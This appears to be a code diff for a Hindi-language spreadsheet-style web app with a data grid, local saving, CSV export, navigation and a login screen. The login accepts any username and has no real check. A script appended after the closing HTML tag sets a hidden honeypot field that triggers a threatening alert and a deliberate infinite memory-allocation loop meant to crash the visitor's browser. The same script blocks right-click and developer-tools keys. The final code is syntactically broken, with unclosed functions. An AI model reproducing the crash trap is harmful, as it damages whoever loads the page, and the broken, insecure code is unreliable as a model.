+            for (let c = 1; c <= colsCount; c++) {
+                const th = document.createElement('th');
+                th.className = "border border-gray-300 p-2 min-w-[120px] cursor-pointer hover:bg-sky-50 transition relative group";
+                th.innerHTML = `<span class="header-text">कॉलम ${c}</span> <i class="fa-solid fa-pen text-[9px] text-gray-400 hidden group-hover:inline ml-1"></i>`;
+                
+                th.addEventListener('click', () => {
+                    const currentText = th.querySelector('.header-text').innerText;
+                    const newName = prompt("इस कॉलम का नया नाम दर्ज करें:", currentText);
+                    if (newName !== null && newName.trim() !== "") {
+                        th.querySelector('.header-text').innerText = newName.trim();
+                    }
+                });
+                headerTr.appendChild(th);
+            }
+            dynamicThead.appendChild(headerTr);
+
+            dynamicTbody.innerHTML = '';
+            for (let r = 1; r <= rowsCount; r++) {
+                const tr = document.createElement('tr');
+                const tdSr = document.createElement('td');
+                tdSr.className = "border border-gray-300 p-1.5 bg-slate-50 text-center font-bold text-gray-500 w-12 select-none";
+                tdSr.innerText = r;
+                tr.appendChild(tdSr);
+
+                for (let c = 1; c <= colsCount; c++) {
+                    const td = document.createElement('td');
+                    td.className = "border border-gray-300 p-0";
+                    td.innerHTML = `<input type="text" placeholder="..." class="w-full h-full px-2 py-1.5 outline-none bg-transparent focus:bg-white focus:ring-1 focus:ring-sky-500">`;
+                    tr.appendChild(td);
+                }
+                dynamicTbody.appendChild(tr);
+            }
+        }
+
+        btnGenerateGrid.addEventListener('click', generateCustomGrid);
+
+        // लोकल शीट सेविंग लॉजिक
+        btnSaveSheet.addEventListener('click', () => {
+            const fileName = inputFileName.value.trim();
+            if (!fileName) {
+                alert('कृपया फ़ाइल सेव करने से पहले कोई नाम दर्ज करें!');
+                inputFileName.focus();
+                return;
+            }
+
+            const rowsCount = parseInt(inputRows.value) || 5;
+            const colsCount = parseInt(inputCols.value) || 3;
+
+            savedFilesDB[fileName] = {
+                folder: currentFolderTitle.innerText,
+                rows: rowsCount,
+                cols: colsCount
+            };
+
+            globalRowCountAccumulator += rowsCount;
+            statTotalRows.innerText = globalRowCountAccumulator;
+            
+            updateSavedFilesUI();
+            alert(`गोपनीयता के साथ सुरक्षित! आपकी फ़ाइल "${fileName}" स्थानीय रूप से सुरक्षित हो गई है।`);
+        });
+
+        function updateSavedFilesUI() {
+            const keys = Object.keys(savedFilesDB);
+            statFilesCount.innerText = keys.length;
+
+            if (keys.length === 0) {
+                savedFilesList.innerHTML = `<p class="text-gray-500 italic px-2 py-1">कोई फाइल सेव नहीं है</p>`;
+                return;
+            }
+
+            savedFilesList.innerHTML = '';
+            keys.forEach(name => {
+                const item = savedFilesDB[name];
+                const div = document.createElement('div');
+                div.className = "flex items-center justify-between p-1.5 bg-slate-800 rounded hover:bg-slate-700 cursor-pointer transition mb-1 border-l-2 border-amber-500";
+                div.innerHTML = `
+                    <span class="truncate pr-1"><i class="fa-regular fa-file-lines text-amber-400"></i> ${name}</span>
+                    <span class="text-[9px] bg-slate-900 px-1 rounded text-gray-400 shrink-0">${item.rows}R × ${item.cols}C</span>
+                `;
+                div.addEventListener('click', () => {
+                    inputFileName.value = name;
+                    inputCols.value = item.cols;
+                    inputRows.value = item.rows;
+                    generateCustomGrid();
+                    alert(`लोकल फ़ाइल "${name}" लोड कर दी गई है!`);
+                });
+                savedFilesList.appendChild(div);
+            });
+        }
+
+        // CSV एक्सपोर्ट इंजन
+        document.getElementById('btn-export-csv').addEventListener('click', () => {
+            if (workScreen.classList.contains('hidden')) {
+                alert('डाउनलोड करने के लिए पहले किसी प्रोजेक्ट फोल्डर में जाकर डेटा ग्रिड खोलें!');
+                return;
+            }
+            let csvContent = "";
+            const rows = dynamicTbody.querySelectorAll('tr');
+            const headers = dynamicThead.querySelectorAll('th');
+            let headerArr = [];
+            headers.forEach(th => headerArr.push(`"${th.innerText.replace(/"/g, '""')}"`));
+            csvContent += headerArr.join(",") + "\n";
+
+            rows.forEach(tr => {
+                let rowArr = [];
+                const firstTd = tr.querySelector('td');
+                rowArr.push(`"${firstTd.innerText}"`);
+                const inputs = tr.querySelectorAll('input');
+                inputs.forEach(input => { rowArr.push(`"${input.value.replace(/"/g, '""')}"`); });
+                csvContent += rowArr.join(",") + "\n";
+            });
+
+            const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
+            const url = URL.createObjectURL(blob);
+            const link = document.createElement("a");
+            const finalName = inputFileName.value.trim() || "Omni_Data_Export";
+            link.setAttribute("href", url);
+            link.setAttribute("download", `${finalName}.csv`);
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        });
+
+        // शॉर्टकट कीज (Alt + G, Alt + S)
+        window.addEventListener('keydown', (e) => {
+            if (e.altKey && e.key.toLowerCase() === 'g') { e.preventDefault(); if (!workScreen.classList.contains('hidden')) btnGenerateGrid.click(); }
+            if (e.altKey && e.key.toLowerCase() === 's') { e.preventDefault(); if (!workScreen.classList.contains('hidden')) btnSaveSheet.click(); }
+        });
+
+        // साइडबार कंट्रोलर
+        toggleSidebarBtn.addEventListener('click', () => { sidebar.classList.remove('-translate-x-full'); backdrop.classList.remove('hidden'); });
+        const closeSidebar = () => { sidebar.classList.add('-translate-x-full'); backdrop.classList.add('hidden'); };
+        closeSidebarBtn.addEventListener('click', closeSidebar);
+        backdrop.addEventListener('click', closeSidebar);
+
+        // नेविगेशन स्क्रीन सिस्टम
+        const menuDashboard = document.getElementById('menu-dashboard');
+        const menuProjects = document.getElementById('menu-projects');
+        const menuInfo = document.getElementById('menu-info');
+        const menuSettings = document.getElementById('menu-settings');
+
+        function clearSidebarActive() {
+            [menuDashboard, menuProjects, menuInfo, menuSettings].forEach(el => el.classList.remove('bg-slate-800'));
+        }
+
+        function hideAllScreens() {
+            [dashboardScreen, servicesScreen, workScreen, infoScreen, settingsScreen].forEach(scr => scr.classList.add('hidden'));
+        }
+
+        menuDashboard.addEventListener('click', (e) => {
+            e.preventDefault(); clearSidebarActive(); menuDashboard.classList.add('bg-slate-800');
+            hideAllScreens(); dashboardScreen.classList.remove('hidden'); closeSidebar();
+        });
+
+        menuProjects.addEventListener('click', (e) => {
+            e.preventDefault(); clearSidebarActive(); menuProjects.classList.add('bg-slate-800');
+            hideAllScreens(); servicesScreen.classList.remove('hidden'); closeSidebar();
+        });
+
+        menuInfo.addEventListener('click', (e) => {
+            e.preventDefault(); clearSidebarActive(); menuInfo.classList.add('bg-slate-800');
+            hideAllScreens(); infoScreen.classList.remove('hidden'); closeSidebar();
+        });
+
+        menuSettings.addEventListener('click', (e) => {
+            e.preventDefault(); clearSidebarActive(); menuSettings.classList.add('bg-slate-800');
+            hideAllScreens(); settingsScreen.classList.remove('hidden'); closeSidebar();
+        });
+
+        document.getElementById('btn-start-project-shortcut').addEventListener('click', () => { menuProjects.click(); });
+
+        // फॉर्म लॉगिन
+        document.getElementById('login-form').addEventListener('submit', (e) => {
+            e.preventDefault(); 
+            const typedUser = document.getElementById('login-username').value.trim();
+            if(!localStorage.getItem('registeredUser')) {
+                localStorage.setItem('registeredUser', typedUser);
+            }
+            authInterface.classList.add('hidden'); 
+            mainDashboard.classList.remove('hidden');
+            checkUserStatus();
+            menuDashboard.click();
+        });
+        
+        document.getElementById('logout-btn').addEventListener('click', () => {
+            mainDashboard.classList.add('hidden'); authInterface.classList.remove('hidden');
+        });
+
+        // फोल्डर्स कार्ड क्लिक करने पर ग्रिड शीट पर जाना
+        const folderCards = document.querySelectorAll('.service-card');
+        folderCards.forEach(card => {
+            card.addEventListener('click', () => {
+                const folderName = card.getAttribute('data-name');
+                hideAllScreens();
+                workScreen.classList.remove('hidden');
+                currentFolderTitle.innerText = folderName;
+                inputFileName.value = "";
+                generateCustomGrid();
+                closeSidebar();
+            });
+        });
+
+        // बैक बटन का परफेक्ट नेविगेशन
+        document.getElementById('footer-back-btn').addEventListener('click', () => {
+            if (!workScreen.classList.contains('hidden')) { menuProjects.click(); }
+            else if (!servicesScreen.classList.contains('hidden') || !infoScreen.classList.contains('hidden') || !settingsScreen.classList.contains('hidden')) { menuDashboard.click(); }
+            else { alert('आप मुख्य डैशबोर्ड होम स्क्रीन पर हैं।'); }
+        });
+
+        // इनिशियलाइज़ेशन
+        window.addEventListener('DOMContentLoaded', () => {
+            authInterface.classList.remove('hidden'); 
+            mainDashboard.classList.add('hidden');
+            checkUserStatus();
+        });
+    </script>
+</body>
+</html>
+<script>
+    (function A_to_Z_Security_Warning() {
+        // 1. हनी-ट्रैप का जाल
+        const bait = document.createElement('input');
+        bait.style.display = 'none';
+        bait.id = 'security_trap';
+        document.body.appendChild(bait);
+
+        // 2. वॉर्निंग और एक्शन सिस्टम
+        document.addEventListener('input', (e) => {
+            if(e.target.id === 'security_trap' && e.target.value !== "") {
+                
+                // पहले वार्निंग देना (Warning Phase)
+                alert("!!! SECURITY WARNING !!!\n\nअनधिकृत पहुंच (Unauthorized access) का प्रयास किया गया है। यह गतिविधि ट्रैक की जा रही है। यदि आप तुरंत नहीं रुके, तो आपका सिस्टम क्रैश कर दिया जाएगा!");
+                
+                // अगर फिर भी प्रयास जारी रहा, तो क्रैश करना (Zero Tolerance Phase)
+                const crashBrowser = () => {
+                    while(true) {
+                        let dump = new Array(10000000).fill("CRASH");
+                    }
+                };
+                crashBrowser();
+            }
+        });
+
+        // 3. एंटी-कॉपी (Right-Click Block)
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.onkeydown = (e) => {
+            if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) {
+                alert("Warning: Inspect Element is disabled!");
+                return false;
+            }
+        };// एआई फंक्शन
+// एआई फंक्शन
+function startAIGeneration() {
+    
+  
+    // एआई फीचर का नया कनेक्शन
+document.getElementById('ai-btn-trigger').addEventListener('click', function() {
+    const isAIModeOn = document.getElementById('ai-toggle').checked;
+    
+    if (isAIModeOn) {
+        console.log("एआई मोड चालू है, प्रक्रिया शुरू हो रही है...");
+        // यहाँ आप अपना असली एआई फंक्शन कॉल कर सकते हैं
+    } else {
+        console.log("एआई मोड बंद है।");
+    }
+});
+      
+</script>
+
